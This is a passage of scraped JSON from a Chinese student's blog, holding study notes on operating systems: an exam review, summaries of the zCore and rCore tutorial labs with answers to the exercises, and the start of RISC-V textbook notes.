期末总结/","text":"本文是对操作系统的课程的期末总结的文档-帮助自己了解整体的结构reference：mooc 上南京大学 骆斌 老师的PPT 操作系统 期末总结过程 —- 算法设备涉及数据机构：设备控制表DCT ；控制器控制表COCT；通道控制表CHCT；系统设备表SDT 作业 - 平日练习 计算机概述 ： 选择 处理器 ： 内核模式，用户模式，中断 处理器管理：进程，程序区别，为什么提出进程，进程状态转换，进程管理（创建）原子操作 线程： 为什么提出线程，线程和进程区别在哪里，用户级线程，内核级线程，多线程的混合实现（CPU调度） 存储：物理内存，（连续，离散），页式管理 寻址，段页区别，管理 设备：I/O子系统，缓冲区，SPooling，脱机 ，磁盘调度 文件：文件逻辑结构，物理结构，目录结构，目录管理，辅存空间 PV操作，霍尔管程 死锁 大题： PV操作，生产-消费同步 ， 读者写者问题，练习题（基础知识 掌握信号量） 死锁避免，银行家算法，其他死锁检测算法，单资源 ，资源分配图 段页式管理 工作原理，缺页替换算法 CPU调度算法 磁盘调度算法 并发程序设计程序执行的外部顺序性（多个程序执行有序） 和 内部顺序性（程序CPU执行有序） 临界区 - 程序段，多个进程停留在相关临界区则出现错误 临界区之多有一个进程，不能无限停留，不能无限等待进入 进临界区 关中断，出临界区 开中断 用户程序 ：信号量 PV原语， semaphore ： 值为可几个进程进入临界区，具有等待进程队列 p 操作 v操作 一一匹配 同步关系 决定 几个信号量 一生产一消费多缓冲 ： 两个信号量sput sget 一个k缓冲队列，两循环队列指针 多生产多消费： 多个进程共享 循环队列指针，对指针增加两个信号量 管程过程 互斥调用 死锁四个必要条件： 互斥，占有和等待，不剥夺，循环等待 死锁的防止： 破坏第一个条件：独占型资源 改造成 共享型资源 破坏三 ：剥夺式调度 破坏四：层次分配 预分配 ： 死锁的避免：银行家算法 死锁的检测：Warshall传递闭包 ，检测后，重启或 检验点重启 文件管理文件物理结构 ： 顺序文件：数组 - 快速存取 ｜预先分配空间，不易增删改 连接文件：链表 - 连接字（指针）为0结尾 ，易于增删改 ｜需要额外空间，仅顺序 直接文件：hash散列 索引文件：《key，value》-索引区，数据区 链表拓展 ｜需要查两次 文件目录： 一级，用户文件众多，容易重名，不利记忆 二级， 用户-文件目录。按用户 有用户权限 树形，可重名，有权限 路径名为根到结点 文件查找： 查找项：文件路径名 查找法：顺序，二分，文件名变换成唯一值“杂凑法” 活动文件表： 多目录访存，多次访问存储器开销大，将常用，正用复制进主存 保存文件目录信息而不是全部信息，能一步找到文件 文件的安全与保护 共享（用户权限），保护（防破坏），保密（防窃取） 保密措施：隐蔽文件目录，设置口令，使用密码 保护措施：副本，存取表（存用户-属性），属性 文件的存取 顺序存取：读指针（可跳），写指针 直接存取：对记录进行操作，hash 索引存取：按键存取 文件的使用 两类接口： 操作文件整体，读写等对文件本身 建立文件：建立文件目录项-分配物理块-申请活动文件表-登记表-返回文件句柄 撤销文件：关闭文件-联访-删去目录项-释放空间 打开文件：申请活动文件表项-查找文件-复制到表项-共享文件处理-返回句柄 关闭文件：表项“用户数” -1 读写文件：找到 逻辑记录- 变为 物理快 定位文件：调整读写指针位置 辅存空间管理 连续分配：访问速度快，定时“碎片”整理“ 非连续：空间管理效率高，便于文件动态增长，收缩 位示图：空闲块管理 - 高速分去配 IO设备操作系统 与 控制器 交互，而非与设备交互 IO控制方式 轮询 中断 CPU负责发出I/O命令，响应中断 ｜控制器负责检查状态 就绪后发送中断 DMA 中断的活由DMA执行 CPU只在数据传送开始（初始化DMA）结束（响应中断，不必保护现场）参与 周期窃取 - CPU访问总线较少，不用的时候可以给DMA用 I/O通道 将I/O指令单独由通道包含处理器执行 可控制多台不同类设备 流程：cpu遇到I/O，启动通道-cpu执行其他-通道完成后发出中断-CPU处理I/O 【并行】 总线 单总线 ： 易于扩充。｜ 传输时延大，串行 传统三总线 ：CPU与I/O隔离，支持更多I/O设备 ｜ 没把I/O分开，速率差别大不幸 南北桥：支持不同速率I/O 通道多级总线：好 从下至上 IO软件 高效率，通用性 设备无关性，出错处理，同步/异步传输，缓冲技术 中断处理程序：检查设备状态寄存器，根据情况处理 错：向上报告错误，重新执行 正常：唤醒等待进程，转换为就绪态 等待：有等待传输I/O，通知启动下一个I/O请求 设备驱动程序 逻辑I/O 转化为 物理I/O 操作 监督 是否 正确执行，纠错， 管理数据缓冲区 功能： 设备初始化，执行设备驱动例程，调用和执行中断程序 只处理一种设备，或一类紧密相关的设备 整体（不移植） ， 分层（移植，开销增加） 独立于设备的I/O软件：适用所有设备，向用户层提供接口 命名，保护，提供数据单位，缓冲，分配状态跟踪，错误处理报告 用户空间的I/O软件 库函数（用访管指令陷入内核，内核函数实现 I/O操作 Spooling 内核外的系统I/O I/O缓冲 解决速度不匹配 单缓冲：数据-缓冲区-用户区-应用程序 ｜ 写：用户区复制到缓冲区 双缓冲：一个供用户程序使用，另一个可继续输入输出 循环缓冲：链表 设备独立性 逻辑设备 - 物理设备 独立开，调用类而不是单个设备 提高灵活性，隔离性， 每类对应设备类表中的一栏 磁盘 Ta=TS+1/2r+b/rN Ta 存取时间 Ts 寻道时间，r磁盘旋转速度（转/秒），B传送字节数，N一个磁道中的字节数 移动臂调度 调度策略：先进先出（低效），最短查找时间优先（饥饿） 扫描算法：单向，双向，电梯调度（当前移动方向没有，反向有请求时，反向） 旋转调度 优化分布：循环排序；优化排列，交叉分布（读取有延迟），按柱面数据读写 虚拟设备： 使用一类物理设备 模拟 另一类物理设备 SPOOLing 磁盘开辟输入井和输出井，有预输入程序，预输出程序，井管理程序 预输入：作业开始前数据预先输入磁盘缓冲区，省去启动输入设备时间 缓输出：输出存在缓冲区，作业执行完，再由操作系统成批处理 将 独占设备 变为共享设备 “假脱机真联机” -（预输入）-输入状态 -（预输入完成）- 收容状态 -（作业调度，选中并创建进程） 执行状态（进程运行） -（作业调度，终止撤离）- 完成状态-（缓输出）- 内存管理段式程序设计- 段覆盖技术（不相关程序替换执行完代码） 复用 - 分区复用，页架复用 地址转换： 逻辑-物理 静态/动态 空间 分去配， 利用主存分配表 存储保护：权限，地址保护异常 存储扩充：对换技术（不运行进程调出），虚拟技术（只调入部分内容） 虚拟技术：随用随调入，容纳进程装入，主存负责进程执行，对用户透明 Cache：由SDRAM，联想存储器，地址转换部件，替换逻辑组成 L1 ：数据缓存 和 指令缓存 L2 : 内置和外置 L3 : 多为外置 存储管理基本模式 单连续存储管理（不可虚拟） 主存分为系统区，用户区 栅栏寄存器 静态重定位 适用单用户单任务 固定分区存储管理：分区数量，大小固定，主存分配表，可动态重定位，有内存内零头 可变分区：已分配区表和未分配区表（链表），内存回收，移动分区（基于动态重定位） 段式存储管理 逻辑地址：段号：单元号 段表项：始址，限长，标志位 共享：不同进程段表项指向同一个段基址 并加保护 虚拟存储：动态装入，与段覆盖不同，用户控制，OS不感知 页式存储管理 物理：页架 ｜ 逻辑：页 ｜ 可不连续 页表：页 - 页架 一一对应 逻辑地址：《页号，单元号》 位示图：记录主存分配情况 共享：不同进程可以使用不同页号共享数据页，但必须使用相同页号共享代码页（否则JMP《页内地址》失效） 快表：Cache（联想存储器）中的部分页表 进程表：标记 进程，页表始址，页表长度 虚拟存储： 首次只把进程第一页装入 ：请求页式存储管理 扩充页表项：虚拟地址，实际地址，标志位 实现：CPU处理不在主存，缺页中断；OS处理吊入空闲页架或调出其他页 段页式存储管理 每一段不必占据连续存储空间，可离散存放在主存页架中 段表项：标志，页表长，页表始址 逻辑地址：段号，页号，单元号 快表无，查询过程：查段表得到页表，页号为偏移量，查到块号，+单元号得到物理地址 页面调度： 缺页中断率：不成功访问/总访问 影响⬆️：可用页架数，页面大小 ，算法 OPT：优先淘汰下一次访问离这次最远的页面 FIFO：优先淘汰最先调入主存的那一页 LRU：优先淘汰最久未被访问 CLOCK：循环队列 反置页表 IPT：MMU用的数据结构 页表项：页架号代表序号，页号，进程标志符，标志位 MMU通过哈希表把进程标识和虚页号转 换成一个哈希值，指向IPT的一个表目 *MMU**遍历哈希链找到所需进程的虚页号， 该项的索引就是页架号，通过拼接位移便可生成物理地址 若遍历整个反置页表中未能找到匹配页表项，说明该页不在内存，产生缺页中断， 请求操作系统调入 中断 与 系统结构寄存器 用户程序可见寄存器：数据，地址（栈指针等） 控制与状态寄存器：PC，CC，标志位等 程序状态字 PSW， 指令 取指，译码，执行 特权指令（OS内核使用），非特权：用户可用 处理器模式： 用户-内核 ： 系统调用，异常，响应中断 内核-用户 ： 中断返回指令 中断 操作系统 “中断驱动”，中断是激活操作系统唯一方式 狭义中断（处理器之外中断），异常（运行指令中断），系统异常（系统调用） 中断系统：硬件子系统（中断响应），软件子系统（中断处理） 指令执行周期最后增加 响应中断操作 中断装置 ： 发现并响应中断 处理器外的中断:由中断控制器发现和响应 处理器内的异常:由指令的控制逻辑和实现线路发现和响应，相应机制称为陷阱 Syscall: 处理器执行陷入指令时直接触发，相应机制称为系统陷阱 中断控制器：控制 和 寄存器 寄存器记录中断 ，指令处理最后检查寄存器 陷阱 与 系统陷阱 中断响应过程： 检查中断寄存器，是否该屏蔽，根据优先级选择 保存 PSW/PC 到 核心栈 转到 中断处理程序 中断处理 保护处理器状态 识别中断源 处理中断 恢复正常操作 - 返回中断进程 或 调整进程队列 多中断处理： 屏蔽 ，优先级，嵌套（《=3，可能改变处理顺序） 进程进程 ： 动态 ， 资源分配和调度的基本单位 包括：OS管理的数据结构P，内存代码C，内存数据D，通用寄存器信息R，程序状态字PSW 可再入程序：相同代码不同数据集，纯代码 不同时间中针对 同一个程序运行 形成两个不同的进程 进程状态： 运行态，就绪态，等待态 graph TD A(运行态) --&gt;|落选| B(就绪态) B(就绪态) --&gt;|选中| A(运行态) C(等待态) --&gt; |等待事件结束|B(就绪态) A(运行态) --&gt; |出现等待事件| C(等待态) 挂起 进程控制块 PCB： 标识信息 - 现场信息（寄存器） - 控制信息 进程映像（内存映像）： PCB，程序块，数据块，核心栈 进程上下文：用户级，寄存器，系统级 队列管理模块：进程管理核心模块 进程控制与管理： 进程创建:进程表加一项，申请PCB并初始化， 生成标识，建立映像，分配资源，移入就绪队列• 进程撤销:从队列中移除，归还资源，撤销标识， 回收PCB，移除进程表项• 进程阻塞:保存现场信息，修改PCB，移入等待 队列，调度其他进程执行• 进程唤醒:等待队列中移出，修改PCB，移入就 绪队列(该进程优先级高于运行进程触发抢占)• 进程挂起:修改状态并出入相关队列，收回内存等资源送至对换区• 进程激活:分配内存，修改状态并出入相关队列• 其他:如修改进程特权 进程切换：中断触发 ，压入PSW/PC 处理中断 被中断进程 保存值， 状态调整，加入队列 选中下一个进程 调整恢复，选中进程 中断返回，弹出PSW/PC 线程单线程（进程）问题：进程切换开销大，进程通信开销大，限制了进程并发的粒度，降低了并行计算的效率 将进程 资源分配 和 系统调度分派执行分离开： 进程 ： 系统资源分配 和保护的独立单位，不需频繁切换 （容纳进程映像，存取保护） 线程 ：系统调度和分配的基本单位，能轻松的被频繁地调度和切换 具有：线程执行状态，受保护的上下文，独立程序指令计数器，执行堆栈，静态存储器（局部变量） 状态：运行，就绪，睡眠 并发多线程优点： 快速线程切换，减少系统管理开销，线程通信易于实现，并行程度提高，节省内存空间 KLT：内核调度方便，本身也可多线程，但是应用程序线程在用户态，控制权切换需要模式切换，开销大 ULT：节省模式切换开销，不打扰内核，程序管理；运行在任何OS；缺点：不能利用多处理器，引起进程堵塞 可用 jacketing 程序 来决定 进程切换 或 传递控制权给另一个线程 内核只负责进程调度 ULT：逻辑并行性 KLT：物理并行性 混合模式：多个ULT映射一些KLT 处理器调度高级调度：能否加入到执行的进程池中 （多新建 终止） 中级调度：决定主存中的可用进程集合 （带 挂起） 低级调度：决定哪个可用进程占用处理器执行 （原三态）","link":"","tags":[{"name":"OS","slug":"OS","permalink":"https://dingiso.github.io/tags/OS/"}]},{"title":"zCore 第二阶段总结及规划","date":"2020-08-01T07:07:32.000Z","path":"2020/08/01/第二阶段总结及规划/","text":"本文是zCore 的第二阶段的总结以及对接下来工作的规划 第二阶段 总结 及 规划计划和总结速度 （有点粗糙） 但是 快速迭代VMO主要的类型 ： VMObjectPaged : 主要的VMO ， 掌控一组物理页面 父节点 掌控的物理页面 映射关系 标志位 高速缓存策略 pin_count 等 VMObjectPhysical ：代表一段连续物理内存 VMObjectSlice : 物理内存切片 树状结构 ： 利用 父节点的 偏移量 和 页面限制来实现 目标单元测试完善 VMO 部分的 单元测试 简化对树结构的 简化 包括 曾经， copy_on_write 利用 一位标志位实现，并调整可读写为，实现不可写，最终在 pagefault的时候在进行 copy 到 直接 copy Debugshell 部分 可能有一些 VMO 部分的bug需要，在zCore 整体了解后，de这部分的bug 建议总觉得 Tutorial 对于 学生的理解有点生涩我的计划是按照学长的计划 PPT 或 视频报告 基础知识的介绍 代码 和 测试的编写 总结 时间计划8.15-30 期末考试，希望作为时间分配，逐渐慢慢推进 9.1 号之后 我的目标仍然还是希望继续进行 zCore-Tutorial 可能就是设计 zCore-Tutorial 实验，争取开肝 zCore-Tutorial v2 可能遇到的问题 debug 过程中可能遇到不可知的难度 Tutorial 编写过程中，希望能 以个人为单位，自己完成zCore 整体的复现，可能会遇到问题 等等","link":"","tags":[{"name":"OS","slug":"OS","permalink":"https://dingiso.github.io/tags/OS/"},{"name":"risc-v","slug":"risc-v","permalink":"https://dingiso.github.io/tags/risc-v/"},{"name":"zCore","slug":"zCore","permalink":"https://dingiso.github.io/tags/zCore/"}]},{"title":"rCore-tutorial 总结文档","date":"2020-07-25T12:07:05.000Z","path":"2020/07/25/rCore-tutorial总结文档/","text":"lab 简单总结本文是对rCore-tutorial第一阶段的6个lab的总结文档，简单概括了每个lab的内容和作用 lab-0 简单总结 为了借用新的特性 nightly std 依赖操作系统 #![no_std] 禁用 panic_handler 也在std库中，但是在运行过程中必须实现，所以我们自己写一个 异常时是要通过堆栈反向捕获异常并清理现场的，暂时不需实现，所以panic直接终止 main函数并不能作为操作系统入口，所以我们用_start 函数代替，并利用 extern &quot;C&quot; 和 # [no_mangle] 来使得他成为入口函数 通过改变链接器参数，使得程序编译成不依赖其他运行时环境的裸机目标 对于一个OS内核，他的起始地址和普通程序不同，在高地址上，通过更改-链接脚本 通过更改链接脚本使得，内核放在正确的地址上，并依次按顺序排放，_start 在先. 内核运行还需要环境支持，所以我们用汇编重写_start ，分配启动栈，并跳转到内核入口 将汇编代码内联到main.rs中，并更改内核入口为rust_main 建立Makefile 保存编译运行参数，方便直接调用运行 OpenSBI 所提供的SBI调用参数 0-8 ，为我们提供操作操作系统的基本功能 输出功能利用core中的输出函数调用SBI的单字符输出，并利用println等宏进行封装 完善 panic 和 abort 功能 lab-1 简单总结 中断处理首先要保存上下文(即寄存器)在栈中,并在中断后恢复,分为两部分: context :通用32个寄存器,保存触发中断的指令地址sepc和系统状态的sstatus 单列 :保存中断主要信息和原因的 scause 和 stval,因为后面需要使用所以单独 利用汇编将寄存器的值存储在栈中,注意栈寄存器sp就是x2,所以需要空出他 利用 STIE 位开启时钟中断,利用 sstatus 的 SIE 位,允许内核态被中断打断 通过sbi_call 可以预约下一次的时钟中断,time参数就是中断时间 总结 时钟中断的调用过程 ## lab-2 简单总结 对于动态内存分配，我们需要实例一个堆对象，而这个对象必须具有以下特征 实现 Trait GlobalAlloc 的分配功能 实现 alloc 和 dealloc 函数 ， 要求分配连续size大小，满足align对齐 使用语义项#[global_allocator]进行标记 编译器便会自动使用我们提供的内存分配函数 先开辟一个u8数组，将首地址和长度付给我们定义好的堆对象即可 探寻内核使用的结尾地址，linker.ld 说明了结尾地址为 kernel_end 我们将此函数实现，并将他的地址 作为 usize 输出皆可。 物理页的管理与分配 页首地址满足 4kB 的倍数 ，页号 x4096 = 页首地址 分配的地址不存在堆或栈中，我们利用FrameTracker封装，实现类似于Box 的智能指针的相关特性，相当于我们对页实现了以下操作： 封装了 &amp;&#39;static mut 类型的引用 提供了 Drop 函数，存在生命周期，超出后自动析构 需要引用计数则外面封装 Arc 针对所有的物理页，我们实现了一个物理页分配器封装对页的操作 1pub static ref FRAME_ALLOCATOR: Mutex&lt;FrameAllocator&lt;AllocatorImpl&gt;&gt; = Mutex::new(FrameAllocator::new(Range::from(PhysicalPageNumber::ceil(PhysicalAddress::from(*KERNEL_END_ADDRESS))..PhysicalPageNumber::floor(MEMORY_END_ADDRESS),))); Mutex&lt;FrameAllocator&lt;AllocatorImpl&gt;&gt; Mutex对分配器加锁防止多个线程访问， FrameAllocator 为主要分配器， AllocatorImpl 为分配器算法。 PhysicalPageNumber::ceil(PhysicalAddress::from(*KERNEL_END_ADDRESS))..PhysicalPageNumber::floor(MEMORY_END_ADDRESS) 分配器分配的内存范围从 kerne_end 结束（上取整）开始到 我们可访问内存的最后的（下取整） 分配器算法利用的是实际物理页和起始地址的偏移量 lab-3 简单总结基础内容 - 关于页表首先： 为什么要用到虚拟地址？简单理解，这是为了方便程序编写者的一种方法。比如我的程序想要运行在这个操作系统上， 我希望不需要考虑操作系统的实际内存情况，难道我还要看一下操作系统的代码，或翻一下手册么？ ， 我希望我的程序用的就是从 0x1 开始的连续地址，那么这个 0x1 就是虚拟地址。 页表：但是在操作系统中，实际运行时是需要使用实际物理地址的，那么我们如何推算物理地址呢，我们可以将这种（虚拟地址-物理地址）看作一种函数（映射）关系f (虚拟地址）= 物理地址 在存储时 就有了两种储存的方法， 第一种 我们将这个 f 函数（简单理解是个线性的）关系储存下来 - 也就是 最开始修改内核 中使用的方法， 只需要统一加一个 偏移量即可。 第二种 我们将每一个 （虚拟地址-物理地址） 也就 (x,y) 按对存储起来，通过查找 虚拟地址，便能获得相应的物理地址。 第二种方法便是我们所说的页表 ， 他是一（多）张，存储这种关系的表，通过查表便能完成 查找物理地址的任务。 而且，虚拟地址也是对物理的地址的一种封装方法，可以实现内核对物理地址的权限管理，也就是我们在页表项的标志位，假设我不希望系统内核所在的地址被其他人写入其他内容，我只需要在页表项上 多级页表：这种方法主要是为了节省内存，同时可以方便我们不用跨物理页去查询这张表。那么他为什么可以节省内存呢？举个小栗子： 内核代码在虚拟地址里 是 0xffffffff80200000 ， 在实际物理地址是 0x80200000 ， 在普通页表中我要这么存储， (0xffffffff80200000,0x80200000,flag) 这样的。同样在表示内核以 0xffffffff 开头的虚拟地址还有很多，这样会无形中增加很多的空间开销，但我们知道不断存储 0xffffffff 是冗余的。所以我们利用分级的方法，可以把页表变成下面的形式（理解方法）： 二级页表 （0xffffffff（虚拟地址的高位），存储下面一级页表的物理页号（首地址） ） 一级页表 （0x80200000（低位），0x80200000（物理地址））通过二级页表查找到一级页表的存储位置，再通过低位找到对应的物理地址。 那么我们实际上对于所有 以开头 0xffffffff 开头的虚拟地址，二级页表中永远只有一个页表项，这就节省了原来每次都要把他写上的空间。 代码部分 更改 linker.ld 的数据存放起址改为虚拟地址，并在各字段加入对齐，使得一个虚拟页不会有两个段。目的是为了可以对每一个段赋予不同的属性 entry.asm 中利用 下面代码使得 CPU模式 变为 Sv39 12345# 8 &lt;&lt; 60 是 satp 中使用 Sv39 模式的记号 li t1, (8 &lt;&lt; 60) or t0, t0, t1 # 写入 satp 并更新 TLB csrw satp, t0 给出内核使用线性映射的偏移量 并 在 entry.asm 中 建立一个boot_page_table 作为初始页表， 第一个映射是 0x8000_0000 -&gt; 0x8000_0000 VPN3 是 10B 所以放在第三位 第二个映射是 0xffff_ffff_8000_0000 -&gt; 0x8000_0000 VPN3 是 111111110B 所以放在 510位 保存第一个映射是违反规则的，但是为了执行 这个asm内的代码，所以要存在这个映射。 将虚拟地址 分为 0..9 的VPN1 9..18的VPN2 18..27的VPN3 页表项 ：PageTableEntry = 标志位+页号 |对 物理页号进行封装 页表 ：PageTable |装满一个物理页的页表项数组 页表智能指针：PageTableTracker 因为页表太大了，所以利用上文提供的工具 FrameTracker ，将这个页表当成一个物理页看待，利用“智能指针”对其进行操作。 内存段：Segment |在很多情况下虚拟页的单位量级太小了，我们对内存的管理可能一次涉及很多页，为了简化操作，我们将很多虚拟页统一封装为一个Segment，它具有以下属性 两种简单的映射类型 ： 线性映射 和 每一帧都有映射 映射到的一块连续的虚拟地址 统一的权限标识 实际应用的映射关系：Mapping | 完成了基础的结构定义，那么我们该实际的对每个线程的映射关系进行封装并完成实际的操作和结构了： 保存了 页表向量 ， 根页表物理页号， 映射信息 find_entry() 实现 给定虚拟页号查找物理页号 map() 实现了实际数据（未写入页中）的写入并构建映射 线性则利用 我们address.rs 中规定的方式直接转换 Framed 则 分割数据 ， 更新页表，写入物理页， 将映射关系写入映射 activate() 实现了将页表起使地址写入satp ，使用Sv39模式并 刷新TLB 实现内核的重映射 ：MemorySet ： 利用我们工作替代原来的蛮夷， lab-4 线程：Thread | 线程是我们关注的实际执行代码的单位，教程的定义包括 线程 ID - 唯一标识线程的身份 线程的栈 - 线程占有一段的虚拟空间来进行利用 所属的进程 代表自身情况的可变变量（Mutex）- 包括 运行上下文，是否休眠，结束等属性 ， 利用 Mutex 来包装使得 Arc&lt;Thread&gt; 保存的线程中的这些值可以被我们使用。 进程： Process | 资源调度的基本单位，只需要保存自身属性和 线程共享页表，内存空间即可 属于 用户态 还是 内核态 共用的 一块 内存空间，页表 线程管理器：Processor | 存放和管理所有的线程，主要包括： 正在执行的线程 调度器 对线程实现调度，包括线程的添加，移除，进行下一个 休眠线程-处于等待状态的一些线程 实现全局的，由Lock封装的管理器，我们利用Mutex和 关闭时钟中断 保证他一直在线 通过设置Context进行一个小的实验，进行验证并执行 mv sp a0 , 通过 __restore 传入一个参数-即我们精心涉及的Context 原来我们是在实验中为了验证中断而开启了中断，现在我们将其放在了线程开始时 中断处理 ： | 线程切换实际为时钟中断的过程，我们需要在中断处理时完成切换 定义的管理器PROCESSOR完成当前线程的 上下文 的保存 管理器为我们分配下一个应该调用的进程，并将他的上下文返回 通过 __restore 转换 如果没有下一个线程，则启动休眠线程，都没有则退出 线程的结束：| 通过设置 ra 时线程顺利结束 原来线程结束触发Exception::InstructionPageFault ，跳转 0x0 通过触发中断，通知操作系统进行释放，ecall 调用 ebreak 将中断包装在结束函数中，标记线程结束，并设置线程结束的 ra 内核栈： | 但发生中断时，会切换到内核态，原来用于处理中断的sp指针需要一个内核栈，专门用于在内核态执行函数 - 防止线程的崩溃导致操作系统的崩溃 只需要一个内核栈，因为只有中断时使用内核栈，而不会有两个线程同时中断 内核栈的地址不能放在通用寄存器中，而sscratch只有内核态能访问，比较合适 实际的做法: 定义kernel_stack分配空间，interrupt.asm中对sscratch操作 为内核栈分配一段空间 运行线程时，将内核栈指针保存在sscratch寄存器中 中断时，则从将 Context 压入 sscratch 指向的栈中（Context 的地址为 sscratch - size_of::&lt;Context&gt;()），同时用新的栈地址来替换 sp（此时 sp 也会被复制到 a0 作为 handle_interrupt 的参数） 从中断中返回时（__restore 时），a0 应指向**被压在内核栈中的 Context**。此时出栈 Context 并且将栈顶保存到 sscratch 中 运行时如何 将内核栈指针保存在sscratch中? lab-5 不能一直运行内核 ，我们要实现把读取存储设备的数据，OpenSBI 进行扫描并设备通过MMIO映射到物理内存的一块了，我们只需要在rust_main 中添加参数，OpenSBI 就会告诉我们映射的地址 _hart_id: 0, dtb_pa: PhysicalAddress(0x82200000) 通过调用 rcore 中的 属性解析device_tree库，我们得到的便是一个 建好的树 - 设备树 通过 递归 从根节点进行递归 ，发现支持 &quot;virtio,mmio&quot; ， 就可以加载他的驱动 初始化设备 时需要进行验证Magic Number ， 确定其为设备树 进一步对节点进行判断， 只读取其中的 Block 块设备 粒度 为 整块，以块为单位读写，（类比硬盘） 实现为 DMA 分配物理页的定义和操作 包括 物理地址-虚拟地址的转换， 分配和去配操作 抽象设备 驱动的接口 ，简单的三种方法 ： 读取设备信息 块设备接口 读取某个块 到 buffer 中， 实现对数据的读取 将 buffer 的数据 写入 某个块， 实现写数据 对块设备的抽象，基本为实现上述 的 三个接口。 文件系统 利用 rcore-fs 通过查找全部设备驱动中的第一个存储设备作为根目录。 同时调用BlockCache::new() 使得设备在内存中具有cache 最后 通过 调用 以实现的接口中的 ls 进行 文件名的输出 lab-6 建立 user crate，作为用户程序的放置位置 - 并为其去除依赖 通过 rcore-fs-fuse 将我们的用户程序编译打包为 ELF 文件-转换为 QCOW_FILE 格式 利用 xmas_elf 解析器将 ELF 文件读到内存中，解析字段，建立内核映射（能中断） 修改Mapping::map 函数 ， 增加 init_data参数为初始化数据 动态分配内存 - 分配的不一定连续 - 利用帧分配的方式 考虑 如果最后剩下的数据不满足一页的情况 加载到内存时， 对 .bss 段进行初始化 利用汇编参数的传递，实现系统调用，从相应的寄存器中取出调用代号和参数，根据调用代号，进入不同的处理流程，得到处理结果 回数值并继续执行： 返回值存放在 x10 寄存器，sepc += 4，继续此 context 的执行 程序进入等待 同样需要更新 x10 和 sepc，但是需要将当前线程标记为等待，切换其他线程来执行 程序终止 不需要考虑系统调用的返回，直接删除线程 编写文件的输入输出流 stdin stdout 实现条件变量，替代原来的阻塞式，增加处理器利用率，增强交互性","link":"","tags":[{"name":"rCore","slug":"rCore","permalink":"https://dingiso.github.io/tags/rCore/"},{"name":"OS","slug":"OS","permalink":"https://dingiso.github.io/tags/OS/"},{"name":"risc-v","slug":"risc-v","permalink":"https://dingiso.github.io/tags/risc-v/"}]},{"title":"rCore实验四总结","date":"2020-07-25T05:47:21.000Z","path":"2020/07/25/实验四/","text":"实验四的分析及解答 实验四 原理：线程切换之中，页表是何时切换的？页表的切换会不会影响程序 / 操作系统的运行？为什么？ 1）线程结束时，ra 结束函数触发时钟中断，中断处理函数调用 prepare_next_thread() , 在实际调用 next_thread.prepare() 最后通过 activate() 激活页表，进行页表的切换 2）不会影响运行，页表切换发生在中断期间，操作系统运行中，我们设立了内核栈，中断期间调用的，一直存在。 设计：如果不使用 sscratch 提供内核栈，而是像原来一样，遇到中断就直接将上下文压栈，请举出（思路即可，无需代码）： 一种情况不会出现问题 - 不操作 sp 一种情况导致异常无法处理（指无法进入 handle_interrupt）- 不保存 sp 寄存器 一种情况导致产生嵌套异常（指第二个异常能够进行到调用 handle_interrupt，不考虑后续执行情况） - 运行两个线程。在两个线程切换的时候，会需要切换页表。但是此时操作系统运行在前一个线程的栈上，一旦切换，再访问栈就会导致缺页，因为每个线程的栈只在自己的页表中 一种情况导致一个用户进程（先不考虑是怎么来的）可以将自己变为内核进程，或以内核态执行自己的代码 - 通过 改变 sp 的存储位置， 使得用户进程有能力访问并修改到 实验：当键盘按下 Ctrl + C 时，操作系统应该能够捕捉到中断。实现操作系统捕获该信号并结束当前运行的线程（你可能需要阅读一点在实验指导中没有提到的代码） handler.rs 通过开启外部中断的方法， 借助 sbi 调用函数，捕捉键盘导致的外部中断，先在 中断处理时打印 ctrl+c 的 sbi 调用返回值，为3 ，判断其为 3 则 kill_current_thread","link":"","tags":[{"name":"rCore","slug":"rCore","permalink":"https://dingiso.github.io/tags/rCore/"},{"name":"OS","slug":"OS","permalink":"https://dingiso.github.io/tags/OS/"},{"name":"risc-v","slug":"risc-v","permalink":"https://dingiso.github.io/tags/risc-v/"}]},{"title":"rCore实验三总结","date":"2020-07-25T00:17:33.000Z","path":"2020/07/25/实验三/","text":"实验三的分析及解答 实验三 原理：在 os/src/entry.asm 中，boot_page_table 的意义是什么？当跳转执行 rust_main 时，不考虑缓存，硬件通过哪些地址找到了 rust_main 的第一条指令？ 1） 因为我们将内核统一使用虚拟地址，所以需要一个初始的页表进行映射，也就是题中所说的boot_page_table， 因为他的asw 不全为0 ， 它包含了 两个 1GB 大页 分别表示映射 虚拟地址 物理地址 0x8000_0000 - 0xC000_0000 0x8000_0000 - 0xC000_0000 0xffff_ffff_8000_0000-0xffff_ffff_c000_0000 0x8000_0000 - 0xc000_0000 第二项 为 我们以后将要使用的虚拟地址 与 物理地址之间的映射 第一项 是因为我们 在 替换页表后，pc 仍不会改变，所以需要先行利用这个继续运行，带pc改变后，改为 第二个映射 2）先从 satp 高位读取内存的映射方式，低位读取 boot_page_table 的物理页号， 读取 VPN3 【30：38】 0xff 为 111111110 为 510 定位到 510项， 判断页表项得知为大页 从表中知道物理页基址为 0x8000_0000 加上，页内偏移量，找到了 rust_main() 的地址 分析：为什么 Mapping 中的 page_tables 和 mapped_pairs 都保存了一些 FrameTracker？二者有何不同？ page_tables 存放页表会用到的页面 mapped_pairs 存放所有映射过的页面， 进程用到的页面 分析：假设某进程需要虚拟地址 A 到物理地址 B 的映射，这需要操作系统来完成。那么操作系统在建立映射时有没有访问 B？如果有，它是怎么在还没有映射的情况下访问 B 的呢？ 没有访问B，我们需要申请建立页表时，会得到 B 的物理地址，但特殊情况， 如果B是内核地址，我们可以直接通过线性偏移量进行访问。 实验框架尚未准备完善）实验：了解并实现时钟页面置换算法（或任何你感兴趣的算法），可以自行设计样例来比较性能 置换算法只需要修改 os/src/memory/mapping/swapper.rs，你可能需要在其中访问页表项 swapper.rs 在 main.rs 中调用 start_kernel_thread 来创建线程，你可以任意修改其中运行的函数，以达到测试效果 为确保PageTableEntry 安全传输 - 为时钟swapper 实现 send 接口 在pop 的时候，如果该页表项PageTableEntry 以访问（ACCESS=1） 或者 已修改 （DIRTY=1） 就将其置零 否则， 就将其替换掉","link":"","tags":[{"name":"rCore","slug":"rCore","permalink":"https://dingiso.github.io/tags/rCore/"},{"name":"OS","slug":"OS","permalink":"https://dingiso.github.io/tags/OS/"},{"name":"risc-v","slug":"risc-v","permalink":"https://dingiso.github.io/tags/risc-v/"}]},{"title":"深入理解计算机系统-RISC-V","date":"2020-07-23T08:03:05.000Z","path":"2020/07/23/计算机组成与设计RISC-V/","text":"本文是在阅读《深入理解计算机系统-RISC-V 》后写的，主要针对risc-v架构的内容的阐述 计算机组成与设计RISC-VChapter1 Computer Abstractions and Technology1.1 Intorduction计算机应用主要分三个领域 ： PC ， 服务器 ，嵌入式 在现在时代 PC 已经逐渐被 